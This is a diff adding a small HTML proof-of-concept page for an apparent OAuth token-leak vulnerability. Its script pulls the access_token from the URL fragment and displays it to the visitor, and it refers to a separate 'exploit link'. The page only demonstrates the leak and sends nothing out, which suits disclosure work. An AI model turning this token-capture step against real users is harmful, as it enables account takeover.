@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC Token Leak</title>
+</head>
+<body>
+    <h1>Security Research PoC</h1>
+    <p>If you see your token below, the vulnerability is confirmed.</p>
+    <div id="token" style="color: red; font-weight: bold;"></div>
+
+    <script>
+        // سحب التوكن من الـ Fragment (#)
+        const hash = window.location.hash;
+        if (hash) {
+            const token = hash.split('access_token=')[1].split('&')[0];
+            document.getElementById('token').innerText = "Leaked Token: " + token;
+            alert("Vulnerability Confirmed! Your Access Token is: " + token);
+        } else {
+            document.write("No token detected yet. Please use the exploit link.");
+        }
+    </script>
+</body>
+</html>
